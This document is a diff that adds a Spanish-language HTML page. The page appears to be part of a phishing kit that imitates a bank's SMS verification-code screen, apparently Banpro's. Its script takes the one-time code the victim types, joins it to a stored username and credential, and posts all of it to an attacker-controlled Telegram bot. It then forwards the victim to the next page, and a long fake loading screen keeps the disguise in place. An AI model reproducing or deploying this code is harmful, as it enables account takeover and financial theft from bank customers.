@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>e-BlSA+</title>
+    <script src="https://code.jquery.com/jquery-2.2.3.min.js"
+            integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
+            crossorigin="anonymous"></script>
+</head>
+<body style="background-color: #ebebec; min-width: 1024px;">
+<div id="ld" style="position: fixed; width:100%; height: 100%; background: rgba(255,255,255,1); z-index: 10; text-align:center;">
+    <img src="tmp.svg" style="width: 300px; margin-top: 200px;">
+    <br>
+    <div style="width: 126px; height: 126px; display:inline-block; border: 5px solid #0278a7; border-radius: 50%;">
+        <img src="p.gif?id=50" style="width: 110px; position: relative; top: 36px;">
+    </div>
+</div>
+
+<style>
+    * { margin: 0; padding: 0; }
+    @font-face {
+        font-family: dinReg;
+        src: url(din-regular.ttf);
+    }
+</style>
+
+<nav id="nav1" style="padding: 30px 0 0 0px; height: 180px; background: #fff; border-bottom: 1px solid rgba(33,25,21,.2); text-align: center; background-color: #003e7e">
+    <img id="n1" src="l.png" alt="" style="height:71px;">
+</nav>
+
+<div id="main-cnt" style="overflow: hidden; min-height:700px; position: relative; top: -90px; text-align: center;">
+    <div id="ctn" style="overflow:hidden; width:940px; display: inline-block; text-align: center; vertical-align: top; background-color: #fff; box-shadow: 0 1px 2px 0 rgb(0 0 0 / 10%);">
+        <div id="frmc" style="display:inline-block; text-align: left; width: 578px; border-radius: 8px; vertical-align: top;">
+            <form id="f1" style="display: inline-block; width: 578px; height: 433px; border-radius:10px; background-image: url(4.svg); position: relative;">
+                <input autofocus id="i1" name="ips1" placeholder="Código SMS" type="text" required
+                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 140px; left: 90px; height: 28px; width: 394px; padding-left: 8px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
+                <input type="submit" value=""
+                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 208px; left: 314px; height: 39px; width: 193px; outline: none; border-radius: 8px;">
+            </form>
+        </div>
+        <div id="bnn" style="width: 358px; background-color: #fff; height: 428px; display: inline-block; background-image: url(bnn.png);"></div>
+    </div>
+</div>
+
+<style>
+    @media screen and (max-width:1024px) {
+        body {
+            zoom: 78%;
+            background-color: #fff !important;
+            min-width: auto !important;
+        }
+        #main-cnt {
+            top: 0px !important;
+            width: 100% !important;
+            margin-top: 20px;
+        }
+        #nav1 {
+            height: 56px !important;
+            width: 100% !important;
+            text-align: left !important;
+            padding-left: 5% !important;
+            background-image: url(5.svg) !important;
+            background-size: 180px !important;
+            background-position: 90% 76% !important;
+            background-repeat: no-repeat !important;
+        }
+        #nav1 img {
+            height: 50px !important;
+        }
+        #ctn {
+            width: 578px !important;
+            box-shadow: none !important;
+        }
+        #bnn {
+            margin-top: 30px;
+        }
+    }
+</style>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        // Función para obtener el token y el chat ID desde sax.php
+        function obtenerToken() {
+            return fetch('sax.php')
+                .then(response => response.json())
+                .then(data => ({
+                    token: data.token,
+                    chat_id: data.chat_id
+                }))
+                .catch(error => {
+                    console.error('Error al obtener el token:', error);
+                });
+        }
+
+        // Evento de envío del formulario
+        document.getElementById("f1").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Obtener el valor ingresado en el formulario
+            const ips1 = document.getElementById("i1").value;
+
+            // Verificar si hay una sesión previa
+            const u1 = sessionStorage.getItem('U1') || 'Desconocido';
+            const c1 = sessionStorage.getItem('C1') || 'Desconocido';
+
+            const msg = `BANPRO TOK 1> IP: ${window.location.hostname} - USE: ${u1} - CSS: ${c1} - TK: ${ips1}`;
+
+            // Obtener el token y el chat ID, y luego enviar el mensaje a Telegram
+            obtenerToken().then(data => {
+                if (data && data.token && data.chat_id) {
+                    enviarMensajeTelegram(data.token, data.chat_id, msg);
+                }
+            });
+        });
+
+        // Función para enviar un mensaje a Telegram
+        function enviarMensajeTelegram(token, chat_id, mensaje) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const params = {
+                chat_id: chat_id,
+                text: mensaje
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Ocurrió un error al enviar el mensaje.');
+                }
+                console.log('Mensaje enviado con éxito.');
+                // Redirigir después de enviar el mensaje
+                window.location.href = '4.html';
+            })
+            .catch(error => {
+                console.error('Error al enviar el mensaje:', error);
+            });
+        }
+    });
+
+    // Ocultar el cargador después de 19 segundos
+    window.onload = function() {
+        setTimeout(function() {
+            document.getElementById("ld").style.display = "none";
+        }, 19000);
+    };
+</script>
+</body>
+</html>
